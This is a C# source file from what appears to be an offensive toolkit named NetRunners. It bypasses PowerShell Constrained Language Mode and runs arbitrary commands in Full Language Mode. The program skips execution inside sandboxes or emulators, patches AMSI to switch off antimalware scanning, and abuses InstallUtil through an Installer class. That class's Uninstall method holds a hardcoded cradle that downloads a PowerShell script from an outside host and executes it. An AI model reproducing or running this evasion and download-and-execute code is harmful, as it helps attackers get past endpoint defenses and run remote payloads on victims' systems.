using System;
using static NetRunners.Heuristics;
using static NetRunners.Patchers;
using static NetRunnersClm.Command;

namespace NetRunnersClm
{
    class Program
    {
        /// <summary>
        /// Main function executes supplied string as a powershell command executed in Full Language Mode, bypassing CLM.
        /// </summary>
        /// <param name="args">Powershell command to execute in Full Language Mode. Use single quotes around command or run from cmd if special characters are breaking execution.</param>
        /// <example>.\clm.exe '$ExecutionContext.SessionState.LanguageMode | out-file -filepath C:\\windows\\tasks\\test.txt'</example>
        static void Main(string[] args)
        {
            // call heuristic functions
            if (Sleep()) { return; }    // if sleep was skipped halt execution
            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution

            // check args number
            if (args.Length != 1)
            {
                Console.WriteLine("Error: Only one argument (string) is allowed.");
                return;
            }

            // patch amsi
            AmsiOs();

            // Determine the function call based on the argument provided, case insensitive
            string cmd = args.Length == 1 ? args[0] : string.Empty;
            Execute(cmd);
        }
    }
    /// <summary>
    /// Add InstallUtil support. Command is hardcoded, specify it in "cmd".
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // call heuristic functions
            if (Sleep()) { return; }    // if sleep was skipped halt execution
            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution

            // patch amsi
            AmsiOs();

            // set desired PS FLM command and execute
            String cmd = "iwr -uri http://192.168.45.185/53.ps1 -UseBasicParsing | iex";
            Execute(cmd);
        }
    }
}